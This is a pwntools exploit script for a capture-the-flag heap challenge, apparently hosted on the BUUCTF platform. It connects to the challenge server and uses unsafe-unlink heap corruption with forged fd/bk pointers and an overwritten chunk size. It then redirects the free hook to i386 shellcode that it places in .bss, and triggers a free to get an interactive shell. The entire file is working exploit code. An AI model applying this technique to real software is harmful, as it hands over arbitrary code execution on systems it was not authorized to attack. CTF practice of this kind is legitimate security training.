from pwn import *

#p = process('./pwn1')
p = remote('node4.buuoj.cn', 27969)

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def alloc(size, content):
    sl(b'1')
    sleep(0.1)
    sl(str(size).encode())
    sleep(0.1)
    sn(content)
    sleep(0.1)

def delete(idx):
    sl(b'2')
    sleep(0.1)
    sl(str(idx).encode())
    sleep(0.1)

def edit(idx, content):
    sl(b'3')
    sleep(0.1)
    sl(str(idx).encode())
    sleep(0.1)
    sn(content)
    sleep(0.1)

heaparray = 0x080EBA00 + 16 * 4
bss_shellcode = 0x080EB8E0
free_hook = 0x080EB4F0

alloc(0x74, b'a\n') #0
alloc(0x74, b'a\n') #1
alloc(0x74, b'a\n') #2
alloc(0x74, b'a\n') #3
alloc(0xf8, b'a\n') #4 0x101
alloc(0x20, b'a\n') #5

edit(3, b'a' * 0x74)

fd = heaparray - 0xc + 4 * 3
bk = heaparray - 0x8 + 4 * 3

edit(3, b'a' * 4 + p32(0x71) + p32(fd) + p32(bk) + b'a' * 0x60 + p32(0x70) + b'\n')
delete(4)
shellcode = asm(shellcraft.sh(), arch='i386', os='linux')

edit(3, p32(heaparray) + b'\n')
edit(0, p32(free_hook) + p32(bss_shellcode) + b'\n')
edit(1, shellcode + b'\n')

edit(3, p32(heaparray))
edit(3, p32(heaparray) + p32(free_hook))
edit(1, p32(bss_shellcode) + b'\n')

delete(0)

p.interactive()